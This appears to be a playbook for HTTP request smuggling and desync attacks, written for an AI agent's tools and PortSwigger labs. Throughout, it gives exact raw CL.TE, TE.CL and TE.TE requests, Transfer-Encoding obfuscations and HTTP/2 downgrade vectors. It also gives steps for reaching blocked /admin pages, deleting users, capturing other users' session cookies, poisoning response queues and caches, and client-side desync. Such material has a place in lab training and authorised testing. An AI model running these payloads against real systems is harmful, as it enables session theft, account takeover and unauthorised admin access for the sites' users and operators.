# HTTP Request Smuggling / Desync Methodology
## Expert-Level Playbook (CL.TE / TE.CL / TE.TE / H2 / CL.0 / desync)

> Highest-volume PortSwigger class (22 practitioner/expert labs). Smuggling
> almost never reproduces through a normalizing HTTP client — always drive the
> core proof with `request_smuggling_probe`, `burp_send_http1_request`, Caido
> raw send, or a raw socket. Browsers are only for observing victim impact.

---

## Phase 1: Recon & Desync Surface Mapping

### 1.1 Preconditions
- A front-end (CDN/LB/reverse proxy) forwards to a back-end over HTTP/1.1 with
  connection reuse. Smuggling exploits front-end vs back-end disagreement on
  where one request ends and the next begins.
- Confirm HTTP/1.1 keep-alive is available. If the front-end speaks HTTP/2 to
  the client, target HTTP/2 desync / downgrade (H2.CL, H2.TE, H2.0).

### 1.2 Tools
```
# Deterministic probe (preferred first move)
request_smuggling_probe url=https://TARGET/ vector=cl_te_timeout

# Raw HTTP/1.1 with exact bytes (bypasses client normalization)
burp_send_http1_request  # keeps your Content-Length / Transfer-Encoding verbatim
caido_local_api operation=send_raw args={raw_request, hostname}
run_shell  # printf raw bytes | openssl s_client -quiet -connect host:443
```

### 1.3 Timing-based detection (safe, non-destructive first)
Send a request whose smuggled portion makes the back-end wait for bytes that
never arrive → the socket hangs ~ the back-end read timeout.
```
# CL.TE timeout probe: front-end uses Content-Length, back-end uses TE
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```
```
# TE.CL timeout probe: front-end uses TE, back-end uses Content-Length
POST / HTTP/1.1
Host: TARGET
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
A large latency delta vs a control request confirms the disagreement. Prefer
`request_smuggling_probe` vectors (`cl_te_timeout`, `te_cl_timeout`) so timing
and status deltas are captured structurally.

---

## Phase 2: Confirming the Vector (differential responses)

Timing is noisy; confirm with a differential where the smuggled prefix poisons
the *next* request on the connection (send probe, then a normal follow-up).

### 2.1 CL.TE (front-end CL, back-end TE)
```
POST / HTTP/1.1
Host: TARGET
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
The back-end sees the `0\r\n\r\n` terminator; `G` is left buffered and prepended
to the next request → the victim/follow-up gets a `GPOST ...` 405/404.

### 2.2 TE.CL (front-end TE, back-end CL)
```
POST / HTTP/1.1
Host: TARGET
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```
Get the chunk sizes exact (hex length lines). `request_smuggling_probe
vector=te_cl_404` sends the canonical differential.

### 2.3 TE.TE (obfuscated Transfer-Encoding)
Both ends support TE but one is tricked into ignoring it. Rotate obfuscations:
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked        (space before colon)
Transfer-Encoding:\tchunked
Transfer-Encoding: chunked\r\n         (dup header, one obfuscated)
X: X\nTransfer-Encoding: chunked
Transfer-Encoding
 : chunked                              (line folding)
```

### 2.4 HTTP/2 desync (downgrade)
When the front-end downgrades H2→H1 to the back-end:
- **H2.CL** — inject a `content-length` in the H2 request; back-end trusts it.
- **H2.TE** — inject `transfer-encoding: chunked` via an H2 header.
- **H2.0 / CL.0** — back-end ignores the body entirely (treats `Content-Length`
  as 0), so the body is parsed as a new request. Use `burp_send_http1_request`
  or Burp's HTTP/2 tooling; raw H2 is required (browsers/curl normalize).
- **Request-line / header injection via H2 pseudo-headers**: smuggle `\r\n` in a
  header name/value to inject a whole request line after downgrade.

---

## Phase 3: Exploitation Patterns (per PortSwigger sub-variant)

| Sub-variant | Goal | Approach |
|-------------|------|----------|
| Confirming CL.TE / TE.CL | detection | differential 404/405 on follow-up |
| Bypass front-end security controls | reach `/admin` | smuggle a request the front-end would block |
| Reveal front-end request rewriting | leak added headers | smuggle a request that reflects the body (search) to see injected `X-*` |
| Capture other users' requests | steal cookies | smuggle a POST to a comment/store endpoint that captures the following victim request |
| Response queue poisoning | full desync | CL.0 / H2 to desync the response queue and serve admin responses to attackers |
| Web cache poisoning via smuggling | persistent XSS | smuggle to poison a cached response |
| Client-side desync (CSD) | browser-driven | back-end ignores body (CL.0); a JS `fetch` keep-alive smuggles into the victim's own connection |

### 3.1 Bypass front-end access control
```
POST / HTTP/1.1
Host: TARGET
Content-Length: <n>
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: TARGET
X-Ignore: X
```
Then a normal follow-up returns the admin page. To delete the user, smuggle the
exact `GET /admin/delete?username=carlos` the lab requires.

### 3.2 Reveal front-end rewriting (find the header name)
Smuggle a POST to a search endpoint with a large `Content-Length` so the next
victim request body is reflected, revealing the internal header the front-end
adds (e.g. `X-SSL-CLIENT-CN`, `X-Forwarded-For`). Then reuse that header.

### 3.3 Capture another user's request
Smuggle a POST to a form that stores+reflects input (comment) with a
`Content-Length` long enough to swallow the victim's subsequent request line +
headers + cookies; read the stored comment to recover the victim `session`.

### 3.4 Response-queue poisoning / CL.0
```
# CL.0: back-end ignores Content-Length on this endpoint (e.g. static/GET)
POST /resources/... HTTP/1.1
Host: TARGET
Content-Length: <n>
Connection: keep-alive

GET /admin HTTP/1.1
Host: TARGET

```
Every subsequent response on the pooled connection is shifted by one → you
receive the admin response intended for the next client. Repeat to steal.

### 3.5 Client-side desync (CSD)
Prove the back-end ignores the body on a specific path, then host a page that
uses `fetch(url,{method:'POST',body:'GET /... ',mode:'no-cors'})` to desync the
victim's *own* browser connection — deliver via the exploit server.

---

## Phase 4: Tooling & Automation

```
# Structured vector sweep
request_smuggling_probe url=https://TARGET/ vector=cl_te_404
request_smuggling_probe url=https://TARGET/ vector=te_cl_404
request_smuggling_probe url=https://TARGET/ vector=cl_te_timeout

# Exact-byte raw send (keep CL/TE untouched)
burp_send_http1_request   # or caido_local_api send_raw
burp_send_to_intruder     # concurrency / offset brute for chunk sizes

# Raw socket fallback (last resort)
run_shell command="printf 'POST / HTTP/1.1\r\nHost: TARGET\r\n...' | openssl s_client -quiet -connect TARGET:443"
```
- Turn OFF automatic `Content-Length`/`Connection` normalization in whatever
  sender you use. Always set `Connection: keep-alive`.
- Send the smuggling request twice (prime + trigger) on the same connection.

---

## Common Failure Modes & Solutions

| Problem | Solution |
|---------|----------|
| Client rewrites CL/TE | Use `burp_send_http1_request` / raw socket, never curl/requests |
| No effect on follow-up | Send both requests down one keep-alive connection; retry to catch queue |
| Chunk parse errors | Recompute hex chunk-size lines; ensure trailing `\r\n\r\n` |
| HTTP/2-only front-end | Switch to H2.CL/H2.TE/H2.0 downgrade vectors |
| Intermittent success | It's a race against real traffic — repeat, use single-connection tooling |
| Front-end blocks TE | Rotate TE.TE obfuscations (space-before-colon, tab, dup, fold) |

## Validation / Success Criteria
- [ ] A control request is stable while the crafted probe causes timeout or a
      queued/`GPOST`-style differential response.
- [ ] The smuggled request reaches the intended endpoint (`/admin`, delete user,
      captured cookie, poisoned cache) — not just a timing anomaly.
- [ ] Exact `Content-Length` / `Transfer-Encoding` bytes preserved in the PoC.
- [ ] Lab solved banner or required victim impact observed.
